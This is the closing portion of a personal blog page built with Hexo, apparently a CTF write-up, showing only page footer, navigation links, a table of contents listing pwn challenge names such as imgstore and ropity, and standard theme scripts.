<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/08/08/tfcctf2024/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/07/22/dasctf2024-summer-challenge/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-08-01 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#imgstore"><span class="toc-article-text">imgstore</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ropity"><span class="toc-article-text">ropity</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#onewrite"><span class="toc-article-text">onewrite</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fermat"><span class="toc-article-text">fermat</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ictf-band"><span class="toc-article-text">ictf-band</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#bopity"><span class="toc-article-text">bopity</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#hopper"><span class="toc-article-text">hopper</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
